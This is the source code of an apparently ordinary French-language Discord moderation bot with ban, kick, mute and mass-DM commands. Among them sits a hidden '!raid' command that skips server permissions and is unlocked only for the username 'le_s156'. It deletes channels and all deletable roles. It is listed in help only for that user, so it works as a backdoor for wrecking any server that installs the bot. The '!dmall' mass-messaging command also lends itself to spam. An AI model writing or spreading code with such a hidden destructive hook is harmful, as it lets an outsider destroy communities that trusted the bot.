const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
});

client.once('ready', () => {
  console.log(`✅ Connecté en tant que ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  const msg = message.content.toLowerCase();

  async function replyChannel(text) {
    await message.channel.send({ content: `${message.author}, ${text}`, reply: { messageReference: message.id } });
  }

  if (msg.startsWith('!dmall')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return replyChannel("❌ Tu n'as pas la permission d'utiliser cette commande.");
    }

    const content = message.content.slice(7).trim();
    if (!content) return replyChannel("❌ Merci d’ajouter un message à envoyer.\nExemple : `!dmall Salut tout le monde !`");

    const members = await message.guild.members.fetch();
    const humanMembers = members.filter(m => !m.user.bot);

    let sent = 0;
    let failed = 0;
    const total = humanMembers.size;
    const failedList = [];

    const progressMessage = await message.channel.send("📤 Envoi en cours... 0%");

    for (const member of humanMembers.values()) {
      try {
        await member.send(content);
        sent++;
      } catch {
        failed++;
        failedList.push(member.user.tag);
      }

      const percent = Math.floor(((sent + failed) / total) * 100);
      await progressMessage.edit(`📨 **Envoi en cours... ${percent}%**\n✅ Envoyés : ${sent} / ${total}\n❌ Échecs : ${failed}`);
      await new Promise(resolve => setTimeout(resolve, 2000));
    }

    await progressMessage.edit(
      `🎉 **DM terminé !**\n\n📊 **Statistiques :**\n✅ Envoyés : ${sent}\n❌ Échecs : ${failed}` +
      (failedList.length > 0 ? `\n\n🚫 **Échecs sur :**\n• ${failedList.join('\n• ')}` : "")
    );

    await message.delete().catch(() => {});
    return;
  }

  if (msg === '!help') {
    let helpMsg =
      "📋 **Commandes disponibles :**\n" +
      "`!help` - Affiche cette aide\n" +
      "`!ping` - Teste la réactivité du bot\n" +
      "`!info` - Infos sur le serveur\n" +
      "`!ban @utilisateur` - Bannir un utilisateur (permission requise)\n" +
      "`!deban @utilisateur` - Retirer un ban (permission requise)\n" +
      "`!kick @utilisateur` - Expulser un utilisateur (permission requise)\n" +
      "`!mute @utilisateur` - Rendre un utilisateur muet (permission requise)\n" +
      "`!dmall [message]` - Envoie un DM à tous les membres (admin uniquement)";

    if (message.author.username === 'le_s156') {
      helpMsg += "\n`!raid [nombre]` - Supprime un nombre de salons et rôles (commande réservée à le_s156)";
    }

    return replyChannel(helpMsg);
  }

  if (msg === '!ping') {
    const start = Date.now();
    const sentMsg = await message.channel.send('🏓 Pong !');
    const end = Date.now();
    const diff = (end - start) / 1000;
    return sentMsg.edit(`🏓 Pong ! Réponse en \`${diff.toFixed(2)}\` seconde(s).`);
  }

  if (msg === '!info') {
    return replyChannel(`📌 Serveur : ${message.guild.name}\n👥 Membres : ${message.guild.memberCount}`);
  }

  if (msg.startsWith('!ban')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) {
      return replyChannel("❌ Tu n'as pas la permission de bannir des membres.");
    }

    const member = message.mentions.members.first();
    if (!member) return replyChannel("❌ Merci de mentionner un utilisateur à bannir.");
    if (member.id === message.author.id) return replyChannel("❌ Tu ne peux pas te bannir toi-même !");
    if (member.id === client.user.id) return replyChannel("❌ Je ne peux pas me bannir moi-même !");

    try {
      await member.ban();
      return replyChannel(`✅ ${member.user.tag} a été banni.`);
    } catch (err) {
      console.error(err);
      return replyChannel("❌ Impossible de bannir cet utilisateur.");
    }
  }

  if (msg.startsWith('!deban')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) {
      return replyChannel("❌ Tu n'as pas la permission de débannir des membres.");
    }

    const user = message.mentions.users.first();
    if (!user) return replyChannel("❌ Mentionne l'utilisateur à débannir.");

    try {
      const bans = await message.guild.bans.fetch();
      if (!bans.has(user.id)) return replyChannel("❌ Cet utilisateur n'est pas banni.");

      await message.guild.bans.remove(user.id);
      return replyChannel(`✅ ${user.tag} a été débanni.`);
    } catch (err) {
      console.error(err);
      return replyChannel("❌ Impossible de débannir cet utilisateur.");
    }
  }

  if (msg.startsWith('!kick')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.KickMembers)) {
      return replyChannel("❌ Tu n'as pas la permission d'expulser des membres.");
    }

    const member = message.mentions.members.first();
    if (!member) return replyChannel("❌ Merci de mentionner un utilisateur à expulser.");
    if (member.id === message.author.id) return replyChannel("❌ Tu ne peux pas t'expulser toi-même !");
    if (member.id === client.user.id) return replyChannel("❌ Je ne peux pas m'expulser moi-même !");

    try {
      await member.kick();
      return replyChannel(`✅ ${member.user.tag} a été expulsé.`);
    } catch (err) {
      console.error(err);
      return replyChannel("❌ Impossible d'expulser cet utilisateur.");
    }
  }

  if (msg.startsWith('!mute')) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.MuteMembers)) {
      return replyChannel("❌ Tu n'as pas la permission de rendre muet des membres.");
    }

    const member = message.mentions.members.first();
    if (!member) return replyChannel("❌ Mentionne un utilisateur à rendre muet.");
    if (member.id === message.author.id) return replyChannel("❌ Tu ne peux pas te rendre muet toi-même !");
    if (member.id === client.user.id) return replyChannel("❌ Je ne peux pas me rendre muet moi-même !");

    try {
      let muteRole = message.guild.roles.cache.find(r => r.name === "Muted");
      if (!muteRole) {
        muteRole = await message.guild.roles.create({
          name: "Muted",
          permissions: []
        });

        for (const channel of message.guild.channels.cache.values()) {
          await channel.permissionOverwrites.edit(muteRole, {
            SendMessages: false,
            AddReactions: false,
            Speak: false,
          });
        }
      }

      await member.roles.add(muteRole);
      return replyChannel(`✅ ${member.user.tag} a été rendu muet.`);
    } catch (err) {
      console.error(err);
      return replyChannel("❌ Impossible de rendre muet cet utilisateur.");
    }
  }

  if (msg.startsWith('!raid')) {
    if (message.author.username !== 'le_s156') {
      return replyChannel("❌ Tu n'as pas la permission d'utiliser cette commande.");
    }

    if (!message.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageChannels) ||
        !message.guild.members.me.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
      return replyChannel("❌ Je n'ai pas les permissions nécessaires (Gestion des salons et des rôles).");
    }

    const args = message.content.split(' ');
    if (args.length < 2) {
      return replyChannel("❌ Merci de spécifier un nombre de salons à supprimer.\nExemple : `!raid 10`");
    }

    const numToDelete = parseInt(args[1]);
    if (isNaN(numToDelete) || numToDelete < 1) {
      return replyChannel("❌ Nombre invalide, merci d'entrer un nombre positif.");
    }

    const confirmationMsg = await message.channel.send(
      `${message.author}, veux-tu vraiment supprimer **${numToDelete}** salons (ou moins s'il y en a moins) **et tous les rôles supprimables** ?\nRéagis avec ✅ pour confirmer ou ❌ pour annuler.`
    );

    await confirmationMsg.react('✅');
    await confirmationMsg.react('❌');

    const filter = (reaction, user) =>
      ['✅', '❌'].includes(reaction.emoji.name) && user.id === message.author.id;

    try {
      const collected = await confirmationMsg.awaitReactions({ filter, max: 1, time: 30000, errors: ['time'] });
      const reaction = collected.first();

      if (reaction.emoji.name === '✅') {
        const channels = message.guild.channels.cache.filter(ch => ch.deletable);
        const channelsToDelete = channels.first(numToDelete);

        let deletedChannelsCount = 0;
        for (const ch of channelsToDelete) {
          try {
            await ch.delete();
            deletedChannelsCount++;
          } catch (err) {
            console.error(`Erreur suppression salon ${ch.name}:`, err);
          }
        }

        const roles = message.guild.roles.cache.filter(role =>
          role.editable &&
          role.id !== message.guild.id &&
          !role.permissions.has(PermissionsBitField.Flags.Administrator)
        );

        let deletedRolesCount = 0;
        for (const role of roles.values()) {
          try {
            await role.delete();
            deletedRolesCount++;
          } catch (err) {
            console.error(`Erreur suppression rôle ${role.name}:`, err);
          }
        }

        await replyChannel(`✅ Suppression terminée : ${deletedChannelsCount} salons et ${deletedRolesCount} rôles supprimés.`);
      } else {
        await replyChannel("❌ Commande annulée.");
      }
    } catch {
      await replyChannel("⌛ Temps écoulé, commande annulée.");
    }

    await confirmationMsg.delete().catch(() => {});
    await message.delete().catch(() => {});
  }
});

client.login(process.env.TOKEN);






